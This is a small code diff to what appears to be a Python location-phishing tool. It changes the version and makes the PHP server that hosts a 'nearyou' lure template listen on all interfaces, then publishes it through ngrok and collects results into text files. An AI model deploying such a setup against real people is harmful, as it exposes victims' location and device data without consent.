@@ -20,7 +20,7 @@ result = '{}/template/nearyou/php/result.txt'.format(swd)
 info = '{}/template/nearyou/php/info.txt'.format(swd)
 api = 'http://localhost:4040/api/tunnels'
 site = 'nearyou'
-ver = '1.0.9'
+ver = '1.1.0'
 
 if sys.version_info[0] >= 3:
     raw_input = input
@@ -72,7 +72,7 @@ def ngrok():
 	global api, site, swd
 	print ('\n' + G + '[+]' + C + ' Starting PHP Server...' + W)
 	with open ('php.log', 'w') as phplog:
-		subp.Popen(['php', '-S', 'localhost:80', '-t', '{}/template/'.format(swd)], stderr=phplog, stdout=phplog)
+		subp.Popen(['php', '-S', '0.0.0.0:80', '-t', '{}/template/'.format(swd)], stderr=phplog, stdout=phplog)
 	print ('\n' + G + '[+]' + C + ' Starting Ngrok...' + W + '\n')
 	subp.Popen(['./Ngrok/ngrok', 'http', '80'], stdin=subp.PIPE, stderr=subp.PIPE, stdout=subp.PIPE)
 	time.sleep(2)
